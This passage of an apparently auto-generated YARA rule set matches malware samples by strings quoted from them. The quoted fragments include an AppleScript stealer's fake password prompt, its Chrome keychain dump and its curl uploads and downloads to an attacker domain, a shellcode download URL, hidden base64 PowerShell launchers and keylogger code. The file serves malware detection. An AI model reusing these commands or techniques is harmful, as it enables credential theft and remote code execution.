      hash1 = "bd01711c037000f01d2ae4592e4a870eb8ff9013f805adae835911556200bd05"
   strings:
      $s1 = "iex $([char]([byte]0x70)+[char]([byte]0x6f)+[char]([byte]0x77)+[char]([byte]0x65)+[char]([byte]0x72)+[char]([byte]0x73)+[char]([" ascii /* score: '8.00'*/
      $s2 = "iex $([char]([byte]0x70)+[char]([byte]0x6f)+[char]([byte]0x77)+[char]([byte]0x65)+[char]([byte]0x72)+[char]([byte]0x73)+[char]([" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6569 and filesize < 80KB and
      all of them
}

rule bd14c04b9eebb0ed93ed19d0bce20c053bd41a16f55d5e7479d72344f3100535_bd14c04b {
   meta:
      description = "_subset_batch - file bd14c04b9eebb0ed93ed19d0bce20c053bd41a16f55d5e7479d72344f3100535_bd14c04b.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "bd14c04b9eebb0ed93ed19d0bce20c053bd41a16f55d5e7479d72344f3100535"
   strings:
      $s1 = "Set alphametics = Londoner.Get(\"Win32_ProcessStartup\").SpawnInstance_" fullword ascii /* score: '26.00'*/
      $s2 = "Set ganglier = Londoner.Get(\"Win32_Process\")" fullword ascii /* score: '23.00'*/
      $s3 = "snarlingly = egotistic.GetParentFolderName(WScript.ScriptFullName)" fullword ascii /* score: '19.00'*/
      $s4 = "rshell -N" fullword ascii /* score: '13.00'*/
      $s5 = "Set Londoner = GetObject(\"winmgmts:root\\cimv2\")" fullword ascii /* score: '12.00'*/
      $s6 = "Set egotistic = CreateObject(\"Scripting.FileSystemObject\")" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x6553 and filesize < 200KB and
      all of them
}

rule bd554b12e48fa566f8721b76e537f19ba3a38d18734c0c386eb1c8e3a77f6324_bd554b12 {
   meta:
      description = "_subset_batch - file bd554b12e48fa566f8721b76e537f19ba3a38d18734c0c386eb1c8e3a77f6324_bd554b12.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "bd554b12e48fa566f8721b76e537f19ba3a38d18734c0c386eb1c8e3a77f6324"
   strings:
      $x1 = "set result_send to (do shell script \"curl -X POST -H \\\"X-Bid: f48fbe39836779cadbf148b5952919fd\\\" https://meshsorterio.com/a" ascii /* score: '35.00'*/
      $x2 = "set result_send to (do shell script \"curl -X POST -H \\\"X-Bid: \" & \"f48fbe39836779cadbf148b5952919fd\" & \"\\\" -F \\\"lil-a" ascii /* score: '35.00'*/
      $x3 = "set result_send to (do shell script \"curl -X POST -H \\\"X-Bid: f48fbe39836779cadbf148b5952919fd\\\" https://meshsorterio.com/a" ascii /* score: '35.00'*/
      $x4 = "        do shell script \"cd /tmp/ && curl https://gamma.meshsorterio.com/trovo/index.php --output SHS.zip && unzip -o SHS.zip &" ascii /* score: '31.00'*/
      $x5 = "        do shell script \"cd /tmp/ && curl https://gamma.meshsorterio.com/trovo/index.php --output SHS.zip && unzip -o SHS.zip &" ascii /* score: '31.00'*/
      $s6 = "do shell script \"ditto -c -k --sequesterRsrc \" & writemind & \" /tmp/salmonela.zip\"" fullword ascii /* score: '29.00'*/
      $s7 = "set result to do shell script \"security 2>&1 > /dev/null find-generic-password -ga \\\"Chrome\\\" | awk \\\"{print $2}\\\"\"" fullword ascii /* score: '27.00'*/
      $s8 = "writeText(password_entered, systemProfile & \"/.pwd\")" fullword ascii /* score: '25.00'*/
      $s9 = "set password_entered to readfile(systemProfile & \"/.pwd\")" fullword ascii /* score: '25.00'*/
      $s10 = "do shell script \"rm /tmp/salmonela.zip\"" fullword ascii /* score: '25.00'*/
      $s11 = "set result_send to (do shell script \"curl -X POST -H \\\"X-Bid: \" & \"f48fbe39836779cadbf148b5952919fd\" & \"\\\" -F \\\"lil-a" ascii /* score: '25.00'*/
      $s12 = "set result to display dialog \"In order to process action required. Input device password to authorize your access:\" default an" ascii /* score: '24.00'*/
      $s13 = "set result to display dialog \"In order to process action required. Input device password to authorize your access:\" default an" ascii /* score: '24.00'*/
      $s14 = "set fileType to (do shell script \"file -b \" & filePosixPath)" fullword ascii /* score: '23.00'*/
      $s15 = "do shell script \"rm -r \" & writemind" fullword ascii /* score: '23.00'*/
   condition:
      uint16(0) == 0x6f20 and filesize < 70KB and
      1 of ($x*) and all of them
}

rule CoinMiner_signature_ {
   meta:
      description = "_subset_batch - file CoinMiner(signature).vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cf4a7f3458a519210c7fce64c8b34bace813cdc9e1657d8fe6445fc46463c145"
   strings:
      $x1 = "'Her grant of nearly $900,000 allows her to hire graduate students for research into how plankton can adapt to changes in salini" ascii /* score: '34.00'*/
      $x2 = "'One mechanism involves disarming a biological process known as autophagy. Under normal circumstances, autophagy allows cells to" ascii /* score: '31.00'*/
      $s3 = "'The U.N. high commissioner for human rights has issued a warning about the misuse of surveillance technology in the wake of rep" ascii /* score: '28.00'*/
      $s4 = "'I am a Jew. Hath not a Jew eyes? Hath not a Jew hands, organs, dimensions, senses, affections, passions? Fed with the same food" ascii /* score: '27.00'*/
      $s5 = "s content, impersonate users and re-share posts in groups to make them appear more popular than they were." fullword ascii /* score: '27.00'*/
      $s6 = "'Once LCRD receives information and encodes it, the payload sends the data to ground stations on Earth that are each equipped wi" ascii /* score: '25.00'*/
      $s7 = "'After weighting the body with cement blocks and dumping it in the ocean, the hit man reported back to his boss that Tom now sle" ascii /* score: '24.00'*/
      $s8 = "'Outlining his findings in a study published by the journal Geology, Menge suggests that electrically charged volcanic ash from " ascii /* score: '24.00'*/
      $s9 = "'After weighting the body with cement blocks and dumping it in the ocean, the hit man reported back to his boss that Tom now sle" ascii /* score: '24.00'*/
      $s10 = "the devastating eruption short-circuited the ionosphere, which produced the clouds that dumped the soaking rains on Napoleon and" ascii /* score: '23.00'*/
      $s11 = "'On Tatoeba, users don't use Tom's name in their sentences. Tom attracts sentences to him during the post process." fullword ascii /* score: '23.00'*/
      $s12 = "'Scarcely more than half the stature of their predecessors, these beings were proportionally slight and lithe. Their skin was of" ascii /* score: '23.00'*/
      $s13 = "'O Our Father in Heaven, Holy be your name, Your Kingdom come, Your will be done, on earth, as it is in heaven. Give us this day" ascii /* score: '22.00'*/
      $s14 = "'Most people form opinions the same way they get colds - they're infected." fullword ascii /* score: '22.00'*/
      $s15 = "'Coffee might have the 1773 Boston Tea Party to thank for its U.S. popularity. After the colonists protested British taxation by" ascii /* score: '21.00'*/
   condition:
      uint16(0) == 0x2027 and filesize < 25000KB and
      1 of ($x*) and 4 of them
}

rule bd8a20c30aa894ad0fc4d35fa0503dd967e0d913fa523fbb79dafb57edbd6782_bd8a20c3 {
   meta:
      description = "_subset_batch - file bd8a20c30aa894ad0fc4d35fa0503dd967e0d913fa523fbb79dafb57edbd6782_bd8a20c3.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "bd8a20c30aa894ad0fc4d35fa0503dd967e0d913fa523fbb79dafb57edbd6782"
   strings:
      $s1 = "5`17]`97]0" fullword ascii /* score: '9.00'*/ /* hex encoded string 'Qyp' */
      $s2 = "utkxswo" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0xe8fc and filesize < 700KB and
      all of them
}

rule bdd6dc1d0faaa426923ad9c479f95605caf1778c46c37a1764dda07b703b71a3_bdd6dc1d {
   meta:
      description = "_subset_batch - file bdd6dc1d0faaa426923ad9c479f95605caf1778c46c37a1764dda07b703b71a3_bdd6dc1d.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "bdd6dc1d0faaa426923ad9c479f95605caf1778c46c37a1764dda07b703b71a3"
   strings:
      $s1 = "consent/c1xx.dll" fullword ascii /* score: '20.00'*/
      $s2 = "consent/wmsgapi.dll" fullword ascii /* score: '20.00'*/
      $s3 = "consent/c2.dll" fullword ascii /* score: '20.00'*/
      $s4 = "consent/c1.dll" fullword ascii /* score: '20.00'*/
      $s5 = "consent/atlprov.dll" fullword ascii /* score: '20.00'*/
      $s6 = "consent/consent.exe" fullword ascii /* score: '19.00'*/
      $s7 = "consent/disco.exe" fullword ascii /* score: '19.00'*/
      $s8 = "consent/aximp.exe.config]" fullword ascii /* score: '14.00'*/
      $s9 = "consent/disco.exe.config" fullword ascii /* score: '14.00'*/
      $s10 = "consent/aximp.exe.config" fullword ascii /* score: '14.00'*/
      $s11 = "consent/msrootpub1.dat" fullword ascii /* score: '14.00'*/
      $s12 = "consent/msrootpub2.dat" fullword ascii /* score: '14.00'*/
      $s13 = "consent/disco.exe.config]" fullword ascii /* score: '14.00'*/
      $s14 = "0` - {" fullword ascii /* score: '9.00'*/
      $s15 = "* =i{Z" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 15000KB and
      8 of them
}

rule be5cad3addb64ff1939e6de0551d69c72463e241a372cf2c18bed5de5815083f_be5cad3a {
   meta:
      description = "_subset_batch - file be5cad3addb64ff1939e6de0551d69c72463e241a372cf2c18bed5de5815083f_be5cad3a.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "be5cad3addb64ff1939e6de0551d69c72463e241a372cf2c18bed5de5815083f"
   strings:
      $s1 = "* -&V+s|" fullword ascii /* score: '13.00'*/
      $s2 = "__vdso_clock_gettime" fullword ascii /* score: '9.00'*/
      $s3 = "__vdso_clock_gettime64" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule cd7bb7173c8c6c6779c9fbcaac03fecb8a181116f7a91bbbba3ed1e3bc3b4be8_cd7bb717 {
   meta:
      description = "_subset_batch - file cd7bb7173c8c6c6779c9fbcaac03fecb8a181116f7a91bbbba3ed1e3bc3b4be8_cd7bb717.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cd7bb7173c8c6c6779c9fbcaac03fecb8a181116f7a91bbbba3ed1e3bc3b4be8"
   strings:
      $s1 = "/bin/systemhelper" fullword ascii /* score: '10.00'*/
      $s2 = "__vdso_clock_gettime" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule ea27d3dec866fcd5b66e67b06f83d6b6346b90796d8c9b831f113fd22dd253a8_ea27d3de {
   meta:
      description = "_subset_batch - file ea27d3dec866fcd5b66e67b06f83d6b6346b90796d8c9b831f113fd22dd253a8_ea27d3de.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ea27d3dec866fcd5b66e67b06f83d6b6346b90796d8c9b831f113fd22dd253a8"
   strings:
      $s1 = "__vdso_clock_gettime" fullword ascii /* score: '9.00'*/
      $s2 = "__vdso_clock_gettime64" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      all of them
}

rule beee40733930655bfd305908f2d501c31f8849403701d703adce54b659e6753c_beee4073 {
   meta:
      description = "_subset_batch - file beee40733930655bfd305908f2d501c31f8849403701d703adce54b659e6753c_beee4073.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "beee40733930655bfd305908f2d501c31f8849403701d703adce54b659e6753c"
   strings:
      $s1 = "[Content_Types].xmlUT" fullword ascii /* score: '9.00'*/
      $s2 = "`5$\",@+A" fullword ascii /* score: '9.00'*/ /* hex encoded string 'Z' */
      $s3 = "[spYKm\"" fullword ascii /* score: '9.00'*/
      $s4 = "#5 5\"5!5#" fullword ascii /* score: '9.00'*/ /* hex encoded string 'UU' */
   condition:
      uint16(0) == 0x4b50 and filesize < 7000KB and
      all of them
}

rule DarkCloud_signature_ {
   meta:
      description = "_subset_batch - file DarkCloud(signature).xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ee7b73b6efb201197fa55636c90b8283e90095c2c2c948daa44cd5fa5a0cb43a"
   strings:
      $s1 = "[Content_Types].xmlUT" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 2000KB and
      all of them
}

rule DarkCloud_signature__5d4b962a {
   meta:
      description = "_subset_batch - file DarkCloud(signature)_5d4b962a.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5d4b962a8061b5eb61046d5c321ec8a68958dd8915664c03508d9fb98dc4ca01"
   strings:
      $s1 = "[Content_Types].xmlUT" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 2000KB and
      all of them
}

rule CobaltStrike_signature__147442e63270e287ed57d33257638324_imphash_ {
   meta:
      description = "_subset_batch - file CobaltStrike(signature)_147442e63270e287ed57d33257638324(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "55861368b74b67a06f447db19b6876fc66a562f411e3d79669af5bc825a6372b"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string*/ /* score: '26.50'*/
      $s2 = "+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" fullword ascii /* base64 encoded string*/ /* score: '14.00'*/
      $s3 = "%c%c%c%c%c%c%c%c%cMSSE-%d-server" fullword ascii /* score: '13.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 60KB and
      all of them
}

rule CobaltStrike_signature__147442e63270e287ed57d33257638324_imphash__1fd45990 {
   meta:
      description = "_subset_batch - file CobaltStrike(signature)_147442e63270e287ed57d33257638324(imphash)_1fd45990.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1fd4599091452aa7d09e0298c1e003a138de9cf4b5c1bf7b025ef93724742bc9"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string*/ /* score: '26.50'*/
      $s2 = "%c%c%c%c%c%c%c%c%cMSSE-%d-server" fullword ascii /* score: '13.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 60KB and
      all of them
}

rule CobaltStrike_signature__f6243a15fa8eee8ee96b5e1144d461f6_imphash_ {
   meta:
      description = "_subset_batch - file CobaltStrike(signature)_f6243a15fa8eee8ee96b5e1144d461f6(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "05e123f3cccfa6c53144229afda655d47a37a2974532f80de1886b24dc94bf04"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string*/ /* score: '26.50'*/
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string*/ /* score: '26.50'*/
      $s3 = "%c%c%c%c%c%c%c%c%cMSSE-%d-server" fullword ascii /* score: '13.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 40KB and
      all of them
}

rule DonutLoader_signature__7c9d4a4d0212d420f6300700665fbe2d_imphash_ {
   meta:
      description = "_subset_batch - file DonutLoader(signature)_7c9d4a4d0212d420f6300700665fbe2d(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a12a4fdc7f4d55e370e8a1a0109fa76b94a4c493b926fc36025f7159a7a4c590"
   strings:
      $x1 = "https://github.com/samninja666/winscreen/raw/refs/heads/main/shellcode.bin" fullword ascii /* score: '36.00'*/
      $s2 = "https://www.microsip.org/download/MicroSIP-3.22.0.exe?3" fullword ascii /* score: '20.00'*/
      $s3 = "%sMicroSIP-3.22.0.exe" fullword ascii /* score: '19.00'*/
      $s4 = " explorer.exe." fullword ascii /* score: '11.00'*/
      $s5 = "runtime error %d" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 60KB and
      1 of ($x*) and all of them
}

rule DonutLoader_signature__7c9d4a4d0212d420f6300700665fbe2d_imphash__60d9f7fc {
   meta:
      description = "_subset_batch - file DonutLoader(signature)_7c9d4a4d0212d420f6300700665fbe2d(imphash)_60d9f7fc.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "60d9f7fc6a5023ab9410aa3dd5c3f640b217eeb7697d611301b7904c7f9b35e6"
   strings:
      $x1 = "https://github.com/samninja666/winscreen/raw/refs/heads/main/shellcode.bin" fullword ascii /* score: '36.00'*/
      $s2 = "https://www.microsip.org/download/MicroSIP-3.22.0.exe?3" fullword ascii /* score: '20.00'*/
      $s3 = "%sMicroSIP-3.22.0.exe" fullword ascii /* score: '19.00'*/
      $s4 = "MicroSIP-3.22.0.exe" fullword ascii /* score: '19.00'*/
      $s5 = " explorer.exe." fullword ascii /* score: '11.00'*/
      $s6 = "runtime error %d" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 60KB and
      1 of ($x*) and all of them
}

rule e8e133a400092f6fbd2241bcb26128e4_imphash_ {
   meta:
      description = "_subset_batch - file e8e133a400092f6fbd2241bcb26128e4(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "02939e62aaf9e3e3b5fa24d1bcfd983f689f26e7d650a947952ab78d90ad5200"
   strings:
      $x1 = "https://github.com/samninja666/winscreen/raw/refs/heads/main/shellcode.bin" fullword ascii /* score: '36.00'*/
      $s2 = "runtime error %d" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 50KB and
      1 of ($x*) and all of them
}

rule f34d5f2d4577ed6d9ceec516c1f5a744_imphash__56937d0e {
   meta:
      description = "_subset_batch - file f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_56937d0e.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "56937d0eb5b5702acd0a7d19206c3e79b99e5e334544a47b342fb4a845f8f29b"
   strings:
      $s1 = "EncryptedZIP.exe" fullword wide /* score: '27.00'*/
      $s2 = "  EncryptedZIP.exe encrypt <path to compress> <encryption key>" fullword wide /* score: '22.00'*/
      $s3 = "  EncryptedZIP.exe decrypt <path to encrypted ZIP> <encryption key>" fullword wide /* score: '21.00'*/
      $s4 = "[+] Removed encryption key from memory" fullword wide /* score: '16.00'*/
      $s5 = "[-] Error decrypting the archive: " fullword wide /* score: '13.00'*/
      $s6 = "[-] Usage:" fullword wide /* score: '13.00'*/
      $s7 = "[+] Wrote encrypted archive " fullword wide /* score: '13.00'*/
      $s8 = "[-] Something went wrong encrypting the archive. {0} left on disk." fullword wide /* score: '13.00'*/
      $s9 = "Encrypter" fullword ascii /* score: '11.00'*/
      $s10 = "[-] Error: " fullword wide /* score: '11.00'*/
      $s11 = "[-] Error closing the crypto stream: " fullword wide /* score: '11.00'*/
      $s12 = "[+] Ready for exfil" fullword wide /* score: '11.00'*/
      $s13 = "[+] Decrypting " fullword wide /* score: '10.00'*/
      $s14 = "[+] Decrypted {0} successfully!" fullword wide /* score: '10.00'*/
      $s15 = "[-] Something went wrong decrypting the file." fullword wide /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 30KB and
      8 of them
}

rule bf62f89833654afabded809c6c21ab321b09898cb7cdbf6dbff300b57f54ec80_bf62f898 {
   meta:
      description = "_subset_batch - file bf62f89833654afabded809c6c21ab321b09898cb7cdbf6dbff300b57f54ec80_bf62f898.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "bf62f89833654afabded809c6c21ab321b09898cb7cdbf6dbff300b57f54ec80"
   strings:
      $x1 = "=powershell -Command \"Start-Process powershell -WindowStyle Hidden -Argume" fullword ascii /* score: '33.00'*/
      $s2 = "=icode.GetString^([system.convert]::Frombase64string^($ddsdgo.replace^(''" fullword ascii /* score: '16.00'*/
      $s3 = "=ntList '-Command \\\"$ddsdgo = ''WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABv" fullword ascii /* score: '16.00'*/
      $s4 = "=AGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQA" fullword ascii /* base64 encoded string*/ /* score: '14.00'*/
      $s5 = "=IABbAFMAeQBzAHQAZQBtAC4AUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBd" fullword ascii /* base64 encoded string*/ /* score: '14.00'*/
      $s6 = "=MABXAHEANgBFAFkAWQB4AEoAVwBvAGkAaABZAFkAWQB5AGMAOQBUAHMAUABGAFYAOQAwAGkATQBa" fullword ascii /* base64 encoded string*/ /* score: '14.00'*/
      $s7 = "=AGEARwBTAGwAZwBVAF8AZwBPAFUAeQA2ADEARgA3AGsASQBiAEEAOQBGAEgARABUAHUANgBk" fullword ascii /* base64 encoded string*/ /* score: '14.00'*/
      $s8 = "=awBzACAAPQAgAEAAKAAoACQAbABmAHMAZABmAHMAZABnACAAKwAgACcAYgBiAHIA" fullword ascii /* base64 encoded string*/ /* score: '10.00'*/
      $s9 = "=IAAgACAAIAAgACAAIAAgACQAYgBhAHMAZQA2ADQAQwBvAG0AbQBhAG4AZAAgAD0AIAAkAGkA" fullword ascii /* base64 encoded string*/ /* score: '10.00'*/
      $s10 = "=IAAgACAAIAAgACAAIAAgACAAJABtAGUAdABoAG8AZAAgAD0AIAAkAHQAeQBwAGU" fullword ascii /* base64 encoded string*/ /* score: '10.00'*/
      $s11 = "ACcAeAA4AD" ascii /* base64 encoded string*/ /* score: '10.00'*/
      $s12 = "=ACAAIAAgACAAIAAkAGwAZgBzAGQAZgBzAGQAZwAgAD0AIAAgACQAQgB5AHQAZQBzACAAKwAkAEIA" fullword ascii /* base64 encoded string*/ /* score: '10.00'*/
      $s13 = "=d@'',''r''^)^)^);iex $OWjuxD\\\"'\"" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6540 and filesize < 60KB and
      1 of ($x*) and 4 of them
}

rule bf6ffeb158a42481d1a7ce9e10a6a567774f87436d8744b0606aa2eee5ace2fd_bf6ffeb1 {
   meta:
      description = "_subset_batch - file bf6ffeb158a42481d1a7ce9e10a6a567774f87436d8744b0606aa2eee5ace2fd_bf6ffeb1.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "bf6ffeb158a42481d1a7ce9e10a6a567774f87436d8744b0606aa2eee5ace2fd"
   strings:
      $x1 = "const _0x332953=_0x1ca6;function _0x9bf6(){const _0x2920f5=['keys','filter','startsWith','extrx_','isArray','extrx_dinvar','exti" ascii /* score: '40.00'*/
      $s2 = "0ymLUNC','4081187vljCiH','545736JDNisr','78hSUFsJ','runtime','onMessage','addListener','command','InsideContentError','Invalid" ascii /* score: '26.00'*/
      $s3 = "20content\\x20received.','ffc4cf7181f8dcb33f01f6177175382c','scriptHash','dynamicVariable','createElement','innerHTML','decompre" ascii /* score: '23.00'*/
      $s4 = "'action':'KeyLogger','content':{'InputName':_0x46f14d,'inputValue':_0x3c0390[_0xf30358(0x18a)]}});}},0x1f4),_0x3a5e92=_0x4b390e=" ascii /* score: '22.00'*/
      $s5 = "essage']({'action':'ScriptLoaded','content':{'HashHtml':bf2c87a808a520}});}_0x54c87c[_0x3ca044(0x16c)]===_0x3ca044(0x176)&&_0x54" ascii /* score: '14.00'*/
      $s6 = "x546b2d=_0xcb0ecd=>{_0xcb0ecd['forEach'](({target_selector:_0x2dcd4e,action_type:_0x1acba9,destination_url:_0x9f396e})=>{const _" ascii /* score: '14.00'*/
      $s7 = "ButtonClicked','input,\\x20textarea','nodeType','input','textarea','includes','observe','body','apply','target','name','unknown'" ascii /* score: '14.00'*/
      $s8 = "_0x68c3b5=_0xe0a6d8['id'],_0x3a26b3=_0x44f654();chrome[_0x453666(0x169)]['sendMessage']({'action':_0x453666(0x18e),'content':{'e" ascii /* score: '9.00'*/
      $s9 = "e[_0x3f3939(0x169)][_0x3f3939(0x178)]({'action':_0x16c49a['data'][_0x3f3939(0x1a3)],'content':_0x16c49a[_0x3f3939(0x1a1)][_0x3f3" ascii /* score: '9.00'*/
      $s10 = "31e82a(0x169)][_0x31e82a(0x178)]({'action':'RedirectAction','content':{'Selector':_0x2dcd4e,'Action':_0x1acba9,'Destination':_0x" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x6f63 and filesize < 20KB and
      1 of ($x*) and all of them
}

rule bfeba24c1a64046a277ffd7e23a5f5ce64f9a76a315f43b93932395ba6401fa9_bfeba24c {
   meta:
      description = "_subset_batch - file bfeba24c1a64046a277ffd7e23a5f5ce64f9a76a315f43b93932395ba6401fa9_bfeba24c.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "bfeba24c1a64046a277ffd7e23a5f5ce64f9a76a315f43b93932395ba6401fa9"
   strings:
      $x1 = "start /min powershell.exe -windowstyle hidden \" <#bacteriocin Civilian Defedation Powerdown bulgur Tandkliniks #>;$Svaere174nmi" ascii /* score: '39.00'*/
      $s2 = "start /min powershell.exe -windowstyle hidden \" <#bacteriocin Civilian Defedation Powerdown bulgur Tandkliniks #>;$Svaere174nmi" ascii /* score: '24.00'*/
      $s3 = "ms:M,zB rrlimdoDerweddeTindInt=Ne.$Kigt  lr P.uLaneSub ') ;Foresatte $Studeopdrts;Foresatte (Affedtes ' SpS PaT ufaSigRDozt S - " ascii /* score: '12.00'*/
      $s4 = "e=$Hyperparoxysm[$Coenobitic];}$Overforbrugets=89493;$Aabningskoncerten=29202;Foresatte (Affedtes ' To$DroG SllOmboEksB ,raForlT" ascii /* score: '9.00'*/
      $s5 = "rant='Administrering2';<#Tiberbreddernes Dynebetrkket Lifebloods Reslegionens Graanendes #>;$Seriekobling=$Lagerindlggelser+$hos" ascii /* score: '9.00'*/
      $s6 = "$ndtestamente; for( $Svaere174=3;$Svaere174 -lt $Gaydiang;$Svaere174+=4){$Minutia=$Svaere174;$Mackaybean+=$Fortidsuhyrer223[$Sva" ascii /* score: '8.00'*/
      $s7 = "lens);}$Kazoos=Affedtes 'V.sMUbeoBrkzDomiC elSmalS,jaTh /Rav ';$Kazoos+=Affedtes 'Unl5D m.Pi 0bri  mp(Ir W,dhi P nIntdF.roSamwDr" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x7473 and filesize < 20KB and
      1 of ($x*) and all of them
}

rule e0c1db5358d4f0bc5cdeaa3def11e7970914e376d10320fd8f4f175d0b7e4a3c_e0c1db53 {
   meta:
      description = "_subset_batch - file e0c1db5358d4f0bc5cdeaa3def11e7970914e376d10320fd8f4f175d0b7e4a3c_e0c1db53.chm"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e0c1db5358d4f0bc5cdeaa3def11e7970914e376d10320fd8f4f175d0b7e4a3c"
   strings:
      $s1 = "<(::DataSpace/Storage/MSCompressed/Content" fullword ascii /* score: '12.00'*/
      $s2 = "HHA Version 4.74.8702" fullword ascii /* PEStudio Blacklist: strings */ /* score: '12.00'*/
      $s3 = "smtp_test" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5449 and filesize < 700KB and
      all of them
}

rule f34d5f2d4577ed6d9ceec516c1f5a744_imphash__3c0ae906 {
   meta:
      description = "_subset_batch - file f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_3c0ae906.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3c0ae906bacae796e85d02b2b054f85e38b3d3c4ac502f26f39fea04b7061b4e"
   strings:
      $s1 = "http://1009.filemail.com/api/file/get?filekey=5QpRtrYzR1zQcW9BFuZRabHqdRaXuHEc9ocFUievkjOWJ1CkU_SrP4e7MNL4EQ&pk_vid=a72224d05f76" wide /* score: '27.00'*/
      $s2 = "Nyetnpntg.exe" fullword wide /* score: '22.00'*/
      $s3 = "@Nyetnpntg, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '21.00'*/
      $s4 = "decryptor" fullword wide /* score: '15.00'*/
      $s5 = "DownloadCompletedEventArgs" fullword ascii /* score: '13.00'*/
      $s6 = "Decryptor3Des" fullword ascii /* score: '11.00'*/
      $s7 = "get_DecryptedData" fullword ascii /* score: '11.00'*/
      $s8 = "PipelineHandlers" fullword ascii /* score: '10.00'*/
      $s9 = "add_DecryptionCompleted" fullword ascii /* score: '9.00'*/
      $s10 = "remove_DecryptionCompleted" fullword ascii /* score: '9.00'*/
      $s11 = "DecryptionCompletedEventArgs" fullword ascii /* score: '9.00'*/
      $s12 = "OnDecryptionCompleted" fullword ascii /* score: '9.00'*/
      $s13 = "DecryptionCompleted" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 40KB and
      8 of them
}

rule DiskWriter_signature__0ddca75880d55c6ea992a6a6f1388b44_imphash_ {
   meta:
      description = "_subset_batch - file DiskWriter(signature)_0ddca75880d55c6ea992a6a6f1388b44(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
